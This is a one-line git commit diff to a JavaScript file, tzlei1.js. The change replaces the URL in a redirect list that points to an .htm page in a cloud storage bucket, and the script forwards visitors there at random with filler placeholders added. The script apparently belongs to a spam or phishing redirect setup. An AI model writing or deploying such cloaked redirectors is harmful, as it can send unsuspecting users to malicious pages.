5175f0a143900d440c6336f56c0796f58b2ad98d
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-15 01:55:11 +0800

    Update tzlei1.js

--- tzlei1.js
+++ tzlei1.js
@@ -1,5 +1,5 @@
 var urls=[
-' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/26aedb4d42b34119966b3a6177d3ddea.htm#{nnnnnnn}{wwww}',
+' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/e8660a13514e462cb4a589077e4679b2.htm#{nnnnnnn}{wwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
